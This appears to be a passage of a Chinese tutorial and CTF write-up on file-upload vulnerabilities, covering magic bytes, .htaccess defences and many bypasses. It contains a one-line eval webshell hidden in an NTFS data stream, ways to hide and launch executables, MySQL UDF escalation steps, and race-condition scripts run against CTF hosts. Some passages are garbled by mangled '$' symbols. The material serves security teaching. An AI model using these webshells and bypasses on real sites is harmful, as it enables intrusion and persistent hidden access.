+<td>424D</td>
+</tr>
+<tr>
+<td>CAD (dwg)</td>
+<td>41433130</td>
+</tr>
+<tr>
+<td>Adobe Photoshop (psd)</td>
+<td>38425053</td>
+</tr>
+<tr>
+<td>JPEG (jpg)</td>
+<td>FFD8FF</td>
+</tr>
+<tr>
+<td>PNG (png)</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>GIF (gif)</td>
+<td>47494638</td>
+</tr>
+<tr>
+<td>XML (xml)</td>
+<td>3C3F786D6C</td>
+</tr>
+<tr>
+<td>HTML (html)</td>
+<td>68746D6C3E</td>
+</tr>
+<tr>
+<td>MS Word&#x2F;Excel (xls.or.doc)</td>
+<td>D0CF11E0</td>
+</tr>
+<tr>
+<td>MS Access (mdb)</td>
+<td>5374616E64617264204A</td>
+</tr>
+<tr>
+<td>ZIP Archive (zip)，</td>
+<td>504B0304</td>
+</tr>
+<tr>
+<td>RAR Archive (rar)，</td>
+<td>52617221</td>
+</tr>
+<tr>
+<td>Wave (wav)，</td>
+<td>57415645</td>
+</tr>
+<tr>
+<td>AVI (avi)，</td>
+<td>41564920</td>
+</tr>
+<tr>
+<td>Adobe Acrobat (pdf)，</td>
+<td>255044462D312E</td>
+</tr>
+</tbody></table>
+<p>显示详细信息</p>
+<p><strong>绕过方法</strong></p>
+<p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>
+<hr>
+<h4 id="5-限制Web-Server对特定类型文件的行为"><a href="#5-限制Web-Server对特定类型文件的行为" class="headerlink" title="5.限制Web Server对特定类型文件的行为"></a>5.限制Web Server对特定类型文件的行为</h4><p><strong>原理</strong></p>
+<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 .&#x2F;upload&#x2F; 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p>
+<p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：</p>
+<blockquote>
+<p>在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此Apache使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对web server行为进行限制。</p>
+</blockquote>
+<p>禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p>
+<ul>
+<li><strong>指定特定扩展名的文件的处理方式</strong>,原理是指定Response的Content-Type可以加上如下几行</li>
+</ul>
+<pre><code>   AddType text/plain .pl .py .php
+</code></pre>
+<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p>
+<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p>
+<ul>
+<li><p>如果要<strong>完全禁止特定扩展名的文件被访问</strong>，用下面的几行</p>
+<pre><code>Options -ExecCGI
+AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别
+</code></pre>
+<p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误</p>
+</li>
+<li><p>强制web服务器对于特定文件类型的处理，<strong>与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</strong></p>
+</li>
+</ul>
+<pre><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;
+ForceType text/plain
+&lt;/FilesMatch&gt;
+</code></pre>
+<ul>
+<li><strong>只允许访问特定类型的文件</strong>.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</li>
+</ul>
+<pre><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;
+order deny,allow
+deny from all
+&lt;/Files&gt;
+</code></pre>
+<p><strong>绕过方法</strong></p>
+<p><strong>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</strong></p>
+<blockquote>
+<p>补充知识htaccess：</p>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>指令来设置。概述来说，htaccess文件是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<hr>
+<h4 id="6-文件系统00截断"><a href="#6-文件系统00截断" class="headerlink" title="6.文件系统00截断"></a>6.文件系统00截断</h4><p><strong>原理</strong></p>
+<p><strong>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。</strong>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p>
+<p><strong>绕过方法</strong></p>
+<p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>
+<hr>
+<h4 id="7-windows-NTFS文件系统特性绕过"><a href="#7-windows-NTFS文件系统特性绕过" class="headerlink" title="7.windows NTFS文件系统特性绕过"></a>7.windows NTFS文件系统特性绕过</h4><p>NTFS交换数据流（alternate data streams简称ADS）是NTFS磁盘格式的新特性，见漏洞详细可查CVE-1999-0278。</p>
+<ul>
+<li>一个完整的流的格式为：::</li>
+<li>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。</li>
+<li>修改宿主文件的内容或流的内容，不会对彼此造成影响。</li>
+<li>流类型总是以 符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 ( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(DATA)，默认流名为空。</li>
+<li>ADS可以省略流名，但不能省略流类型。</li>
+<li>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流( I N D E X A L L O C A T I O N ) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEXALLOCATION)，流名默认为I30</li>
+</ul>
+<p>当我们对一个在NTFS分区中的ASP文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了:: DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</p>
+<p><strong>绕过方法</strong></p>
+<ol>
+<li>IIS目录访问权限绕过：在IIS6.0+PHP、IIS7+asp、IIS7.5+php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li>
+</ol>
+<pre><code>/admin::$INDEX_ALLOCATION/index.php
+/admin:$i30:$INDEX_ALLOCATION/index.asp
+</code></pre>
+<ol>
+<li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>上传的文件名</th>
+<th>服务器表面现象</th>
+<th>生成的文件内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Test.php:a.jpg</td>
+<td>生成Test.php</td>
+<td>空</td>
+</tr>
+<tr>
+<td>Test.php::$DATA</td>
+<td>生成test.php</td>
+<td><?php phpinfo();?></td>
+</tr>
+<tr>
+<td>Test.php::$INDEX_ALLOCATION</td>
+<td>生成test.php文件夹</td>
+<td></td>
+</tr>
+<tr>
+<td>Test.php::$DATA\0.jpg</td>
+<td>生成0.jpg</td>
+<td><?php phpinfo();?></td>
+</tr>
+<tr>
+<td>Test.php::$DATA\aaa.jpg</td>
+<td>生成aaa.jpg</td>
+<td><?php phpinfo();?></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>注意：</strong><br>对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，从而认为其宿主文件名为1.asp而将.jpg识别为流名。<br>通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。<br>然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。原因是在PHP+IIS的环境下，” 同义. &gt;同义? &lt;同义*</p>
+</blockquote>
+<ol>
+<li>隐藏webshell：在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，命令如下：echo ^<?php @eval(request[cmd])?^ >> index.php:hidden.jpg
+这样生成了一个不可见的shell hidden.jpg，type dir del命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</li>
+<li>mysql中的udf提权:</li>
+</ol>
+<blockquote>
+<p>如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。<br>而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</p>
+</blockquote>
+<p>如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。<br>而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。</p>
+<p>Mysql 5.0.67之前，DLL的导入目录是C:\windows\system32<br>从MySQL 5.1开始，要求目录必须是mysql目录下的lib\plugin\目录，而且mysql 5.1之后的常用安装版本是默认不存在lib\plugin目录的。</p>
+<p>执行sql语句</p>
+<pre><code>show variables like &#39;%plugin%&#39;;
+</code></pre>
+<p>查看目录位置。<br>利用ADS依次创建lib、plugin目录</p>
+<pre><code>select &#39;xxx&#39; into outfile &#39;E:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;
+</code></pre>
+<p>如果创建失败的话，执行</p>
+<pre><code>show variables like &#39;%secure%&#39;;
+</code></pre>
+<p>看看<strong>secure_file_priv</strong>的值：</p>
+<p>如果创建失败的话，执行</p>
+<pre><code>show variables like &#39;%secure%&#39;;
+</code></pre>
+<p>看看secure_file_priv的值：</p>
+<ul>
+<li>null表示限制mysqld不允许导入导出</li>
+<li>当secure_file_priv的值为&#x2F;tmp&#x2F;，表示限制mysqld 的导入导出只能在&#x2F;tmp&#x2F;目录下</li>
+<li>当secure_file_priv的值为空，表示不对mysqld的导入导出做限制</li>
+</ul>
+<ol>
+<li>隐藏exe文件</li>
+</ol>
+<pre><code>type muma.txt test.txt:muma.exe
+</code></pre>
+<p>在xp中可以用start test.txt:muma.exe执行，但是win7以上这样执行会报错。win7及之后的系统的正确姿势如下：<br>创建一个符号链接文件test.exe，链接到寄生的交换数据流可执行文件test.txt:muma.exe上：mklink test.exe,test.txt:muma.exe，然后执行start test.exe &#x2F;b即可<br>更新一个方法：</p>
+<pre><code>wmic process call create &quot;C:\ProjectCode\test\test:putty.exe&quot;
+</code></pre>
+<blockquote>
+<p>在WinXP中，可执行文件可以和文本文件一样实现真正的隐藏，这可能也是当时大多数杀毒软件添加数据流病毒查杀功能的原因；在Win7之后的系统中，微软可能出于安全考虑，不允许直接运行交换数据流可执行文件，必须要创建符号链接，这个符号链接是可见的（当然可以使用其他手段隐藏这个符号链接），并且这个符号链接创建出来后不能复制到其他地方，只能在创建的那个位置使用命令行方式调用（鼠标双击会报错）。</p>
+</blockquote>
+<p><strong>查看隐藏流文件</strong></p>
+<blockquote>
+<p>使用这两款小工具配合进行检测和清除寄生的交换数据流<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/share/link?shareid=134850&uk=1108295926">https://pan.baidu.com/share/link?shareid=134850&amp;uk=1108295926</a><br>labs.exe检测，streams.exe进行清理。<br>还有一个叫做AlternateStreamView的工具也可以</p>
+</blockquote>
+<hr>
+<h4 id="8-二次渲染绕过"><a href="#8-二次渲染绕过" class="headerlink" title="8.二次渲染绕过"></a>8.二次渲染绕过</h4><p>感觉这个的知识点偏向文件格式分析(MISC)。在制作图片马的时候</p>
+<p>往往是在图片后头附件一段php代码，或者是改包发送一个图片马。但是如果使用了二次渲染。我们上传的文件名称会被修改，并且文件末尾段一些冗余的信息（一句话木马）会被删除。</p>
+<p>所以很明显，我们只需要将我们需要写入的东西塞在图片中间（虽然会使图片损坏，但是我们又不需要图片。。），用winhex或者是010editor等在文件内进行修改即可。</p>
+<hr>
+<h4 id="9-条件竞争"><a href="#9-条件竞争" class="headerlink" title="9.条件竞争"></a>9.条件竞争</h4><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
+<pre><code>#-*-coding:utf-8-*-
+import threading
+COUNT = 0
+
+def Run(threads_name):
+    global COUNT
+    read_value = COUNT
+    print &quot;COUNT in Thread-%s is %d&quot; % (str(threads_name), read_value)
+    COUNT = read_value + 1
+
+def main():
+    threads = []
+    for j in range(10):
+        t = threading.Thread(target=Run,args=(j,))
+        threads.append(t)
+        t.start()
+    for i in range(len(threads)):
+        threads[i].join()
+    print (&quot;Finally, The COUNT is %d&quot; % (COUNT,))
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<p>按照我们的预想，结果应该都是10，但是发现结果可能存在非预期解，并且出现非预期的概率还挺大的。</p>
+<p>这是什么原因呢？</p>
+<p>原因就在于我们没有对变量COUNT做同步制约，导致可能Thread-7在读COUNT,还没来得及更改COUNT,Thread-8抢夺资源，也来读COUNT,并且将COUNT修改为它读的结果+1，由此出现非预期。</p>
+<p>同样的，WEB应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p>
+<p>例子：</p>
+<p>例一：金额提现</p>
+<p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元</p>
+<p>例二：moctf</p>
+<p>打开网址后一直打开的是index2.php 修改为index.php后发现还是会跳转到index2 抓包修改index.php。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>发现index.php是一个302网页，因此就可以看到这里存在的一个文件uploadsomething.php。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314135623247.png" alt="在这里插入图片描述"></p>
+<p>随便填写文件名下面写入代码，再进行提交。</p>
+<p>访问后<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314135639427.png" alt="在这里插入图片描述"><br>因此这里就需要用到条件竞争，不断的向网站发送请求，然后边发送边访问。</p>
+<p>写入一个py文件一直发requests即可</p>
+<pre><code>import requests
+url=&quot;http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php&quot;
+while 1:
+    print (requests.get(url).text)
+</code></pre>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/20200314171044419.png" alt="在这里插入图片描述"></p>
+<p>例三：XMAN-Easy Gallery</p>
+<p>伪协议读取代码</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php">http://202.112.51.184:8004/index.php?page=php://filter/read=convert.base64-encode/resource=upload.php</a></p>
+</blockquote>
+<pre><code>&lt;html lang=&quot;zh-CN&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;?php
+$error=$_FILES[&#39;pic&#39;][&#39;error&#39;];
+$tmpName=$_FILES[&#39;pic&#39;][&#39;tmp_name&#39;];
+$name=$_FILES[&#39;pic&#39;][&#39;name&#39;];
+$size=$_FILES[&#39;pic&#39;][&#39;size&#39;];
+$type=$_FILES[&#39;pic&#39;][&#39;type&#39;];
+try&#123;
+    if($name!==&quot;&quot;)
+    &#123;
+        $name1=substr($name,-4);
+        if(($name1!==&quot;.gif&quot;) and ($name1!==&quot;.jpg&quot;))
+        &#123;
+            echo &quot;hehe&quot;;
+            echo &quot;&lt;script language=javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;/script&gt;&quot;;
+            exit;
+        &#125;
+        if($type!==&quot;image/jpeg&quot;&amp;&amp;$type!==&quot;image/gif&quot;)
+        &#123;
+            echo mime_content_type($tmpName);
+            echo &quot;&lt;script language=javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;/script&gt;&quot;;
+            exit;
+        &#125;
+        if(is_uploaded_file($tmpName))&#123;
+            $time=time();
+            $rootpath=&#39;uploads/&#39;.$time.$name1;
+            if(!move_uploaded_file($tmpName,$rootpath))&#123;
+                echo &quot;&lt;script language=&#39;JavaScript&#39;&gt;alert(&#39;文件移动失败!&#39;);window.location=&#39;index.php?page=submit&#39;&lt;/script&gt;&quot;;
+                exit;
+            &#125;
+            else&#123;
+                sleep(5);
+                if ($type==&#39;image/jpeg&#39;)
+                &#123;
+                    $im = @imagecreatefromjpeg($rootpath);
+                    if(!$im)&#123;
+                      $im = imagecreatetruecolor(150, 30);
+                      $bg = imagecolorallocate($im, 255, 255, 255);
+                      $text_color = imagecolorallocate($im, 0, 0, 255);
+                      imagefilledrectangle($im, 0, 0, 150, 30, $bg);
+                      imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);
+                    &#125; else &#123;
+                        $time=time();
+                        $new_rootpath=&#39;uploads/&#39;.$time.$name1;
+                        imagejpeg($im,$new_rootpath);
+                    &#125;
+                &#125;
+                else if ($type==&#39;image/gif&#39;)
+                &#123;
+                    $im = @imagecreatefromgif($rootpath);
+                    if(!$im)&#123;
+                      $im = imagecreatetruecolor(150, 30);
+                      $bg = imagecolorallocate($im, 255, 255, 255);
+                      $text_color = imagecolorallocate($im, 0, 0, 255);
+                      imagefilledrectangle($im, 0, 0, 150, 30, $bg);
+                      imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);
+                    &#125; else &#123;
+                        $time=time();
+                        $new_rootpath=&#39;uploads/&#39;.$time.$name1;
+                        imagegif($im,$new_rootpath);
+                    &#125;
+                &#125;
+                unlink($rootpath);
+            &#125;
+        &#125;
+        echo &quot;图片ID：&quot;.$time;
+    &#125;
+&#125;
+catch(Exception $e)
+&#123;
+    echo &quot;ERROR&quot;;
+&#125;
+//
+ ?&gt;
+ &lt;/html&gt;
+</code></pre>
+<p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg()返回图像资源，文件名更换为新的时间戳，用新的文件路径 n e w r o o t p a t h 输 出 图 片 ， 最 后 删 除 原 文 件 u n l i n k ( new_rootpath输出图片，最后删除原文件unlink( newrootpath输出图片，最后删除原文件unlink(rootpath);如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件unlink($rootpath);上传过程中存在一个延时函数sleep(5)，所以上传的文件即使验证不成功也有5秒钟的时间存在。</p>
+<p>python的payload。</p>
+<pre><code>import requests
+import time
+id = int(time.time())
+s=requests.session()
+data0=&#123;&#39;v&#39;:&quot;phpinfo();&quot;,&#125;
+data1=&#123;
+    &#39;v&#39;:&quot;system(&#39;ls&#39;);&quot;
+&#125;
+data2=&#123;
+    &#39;v&#39;:&quot;system(&#39;cat xxxxxxxxxasdasf_flag.php&#39;);&quot;
+&#125;
+while 1:
+    for i in range(id-50,id+50):
+        url = &#39;http://202.112.51.184:9005/index.php?page=phar://./uploads/&#39; + str(i) + &#39;.jpg/v&#39;
+        t=s.post(url,data=data1).content
+        print i
+        if &#39;flag&#39; in t:
+            print t
+            break
+</code></pre>
+<hr>
+<h4 id="10-其它方式—绕过"><a href="#10-其它方式—绕过" class="headerlink" title="10.其它方式—绕过"></a>10.其它方式—绕过</h4><p><strong>原理</strong></p>
+<p><strong>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</strong></p>
+<p><strong>绕过方法</strong></p>
+<ul>
+<li>后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</li>
+<li>双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的； 例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</li>
+<li>特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</li>
+</ul>
+<hr>
+<hr>
+<h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><p><a target="_blank" rel="noopener" href="https://download.csdn.net/download/qq_43390703/12248471">靶场资源链接、环境资源一键安装</a></p>
+<p>实战依据upload靶场进行实验训练，upload靶场涵盖目前所有类型的上传漏洞，将靶场漏洞题目全部刷完即可完全全部的上传漏洞的训练。</p>
+<p>首先对一个文件进行分析，从而对PHP和源代码环境进行深入理解。</p>
+<pre><code>&lt;li id=&quot;show_code&quot;&gt;
+    &lt;h3&gt;代码&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+</code></pre>
+<p>文件基本格式步分析。</p>
+<blockquote>
+<p>deny_ext :黑名单列表</p>
+<p>trim(): :删除字符串两端的空格或其他预定义字符。用trim()函移除字符。我们没有添加移除的字符，就默认移除下列字符”\0” - NULL、”\t” - 制表符、”\n” - 换行、”\x0B” - 垂直制表符、”\r” - 回车、” “ - 空格（ltrm、rtrim）</p>
+<p>deldot() :把文件后面的点删除windows的特性会自动对后缀名去”.” 处理比如: webshell.php. 。</p>
+<p>strrchr() :查找字符串在另一个字符串中最后-次出现的位置,并返回从该位置到字符串结尾的所有字符(截取后缀)</p>
+<p>str_ireplace():替换字符串中的一些字符（不区分大小写）。遵循的一些规则如果搜索的字符串是一个数组那么它会返回一个数组，且对数组中的每个元素进行查找和替换。（str_replace区分大小写）用str_ireplace(’::$DATA’, ‘’, f i l e e x t ) 函 数 防 止 在 后 缀 中 添 加 “ : : file_ext)函数防止在后缀中添加”:: fileext)函数防止在后缀中添加”::DATA”绕过利用windows特性，可在后缀名中加” ::$DATA”绕过</p>
+<p>strtolower(): 故名思意</p>
+<p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。strrpos() 函数对大小写敏感。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_stripos.asp">stripos()</a> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strpos.asp">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br>getimagesize() :用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</li>
+</ul>
+</blockquote>
+<p>通过上面对整体内容有了大概理解。开始闯关刷题。</p>
+<hr>
+<p>**场景一 **</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586101.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586102.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586103.png" alt="Sample"></p>
+<p>绕过前端即可，将文件名改成jpg，上传后用burpsuit修改后缀名，之后查看包反馈的文件路径，再用中国菜刀连接一句话木马，完成夺下目标。这些流程都是一样的，只不过是绕过不妨不同，后面两步在后面不做重复说明。</p>
+<hr>
+<p><strong>场景二</strong></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586104.png" alt="Sample"></p>
+<p>修改类型检查，如上图（箭头提示作用，实际不存在）</p>
+<hr>
+<p><strong>场景三</strong></p>
+<pre><code>#后缀绕过常用手段
+PHP:
+php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)
+ASP：
+asa、cer、cdx
+ASPX：
+ascx、ashx、asac
+JSP：
+jsp、jspx、jspf
+</code></pre>
+<p>为什么上面的东西可以绕过呢？</p>
+<p>这是利用了配置中正则解析的小错误实现的。</p>
